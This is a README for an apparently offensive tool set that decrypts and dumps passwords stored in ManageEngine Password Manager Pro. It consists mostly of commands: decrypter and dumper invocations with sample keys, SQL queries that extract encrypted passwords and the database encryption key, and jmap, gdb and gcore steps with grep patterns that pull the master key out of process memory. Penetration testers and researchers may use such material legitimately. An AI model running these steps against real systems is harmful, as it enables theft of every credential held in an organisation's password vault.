# PMP-tool

###### summer of hack 2020



Some tools for decrypting/dumping Password Manager Pro passwords  

Dependencies:
 - python3
 - pycryptodome
 - pgpy (Only if you wish to decrypt database encrypted data)


## Decrypter

### Examples

Decrypt passwords from file:

```bash
./decrypter.py -k 7mNUUU+qQa9f6FMGRDCwllpdz/+Nf/1ahvEgj75FX/4\= --file example/decrypted_passwords.txt
```

Decrypt database-encrypted passwords from file:

```bash
./decrypter.py -k 7mNUUU+qQa9f6FMGRDCwllpdz/+Nf/1ahvEgj75FX/4\= -m xm6C2pZAC/yCcAxW6lQOUEgbb732ue99BjO9wu0f1tg= --file example/passwords.txt --encrypted
```

Decrypt a single database-encrypted password:

```bash
./decrypter.py -k 7mNUUU+qQa9f6FMGRDCwllpdz/+Nf/1ahvEgj75FX/4\= -m xm6C2pZAC/yCcAxW6lQOUEgbb732ue99BjO9wu0f1tg= --password wwwECQECsR/EjgtjwlTSUQFN8qQRmKRB0manYvU++KDTurezkOX5QwcrZEMdHLdTbAm1M2qHTUmB8LE5MZ5wDxtpzBR73p02ifya3QY5nVL/0y05/CSyEl7E+BoxrUn8+g== --encrypted
```

## Dumper

### Installation

```bash
sudo apt-get -y install libpq-dev
pip3 install -r requirements.txt
```

### Examples

Dump all passwords for default DB creds (`postgres:postgres@127.0.0.1:2345/PassTrix`):

```bash
./dumper.py -k XcLyN2ycqDkgHUwCh7ABPDfDCQXMspN2PwLr2LEjfCg=
```

Test if you have the right key:

```bash
./dumper.py -k XcLyN2ycqDkgHUwCh7ABPDfDCQXMspN2PwLr2LEjfCg= -c test
```

## PostgreSQL

You can use this commands (or their MySQL equivalent) to gain some info manually

To get encrypted `DB_ENCRYPTION_KEY` (you can than decrypt it with decrypter):

```SQL
select notesdescription from Ptrx_NotesInfo where noteid = 1;
```

To retrieve encrypted passwords (no database decryption):

```SQL
select encode(password, 'base64') from ptrx_passbasedauthen;
```


To retrieve encrypted passwords:

```SQL
select decryptschar(password, <DB_ENCRYPTION_KEY>) from ptrx_passbasedauthen;
```

OR

```SQL
select pgp_sym_decrypt(password, <DB_ENCRYPTION_KEY>, 's2k-mode=1, cipher-algo=aes256') from ptrx_passbasedauthen;
```

## Memory Dump

If you can execute commands on the host, you can read the PMP key from a file `PMP/conf/pmp_key.key`. However, if the file is removed (according to the deploy instructions), you can try dumping it from memory

**0. Get WrapperSimpleApp PID**

```bash
jps | grep WrapperSimpleApp # Or find it yourself
```

**1. JMAP**

If the host have jdk installed you can simply use Jmap

```bash
jmap -dump:file=dump.dump <process-id>
```

Then analyze the dump with any java heap analyzer tool. For example - [Eclipse Memory Analyzer](https://www.eclipse.org/mat/).  
Load the dump into analyzer (`File -> load heap dump`) and follow `java.net.URLClassLoader -> list objects -> with outgoing references -> classes -> elementData -> <Find the one with class com.adventnet.passtrix.ed.PMPEncryptDecryptImpl> -> pmp32BitKey`

**2. GDB**

**Requires root privileges**

```bash
gdb --batch --pid <process-id> -ex "dump memory mem.dump 0xf5580000 0x100000000" && grep -a -m2 -E "[A-Za-z0-9\+/]{43}=" mem.dump
```

**3. GCORE**

**Requires root privileges**  
Works half of the time `-_0_0_-`

```bash
gcore -a <process-id>
grep -a -E "[A-Za-z0-9\+/]{43}=" core.*
```

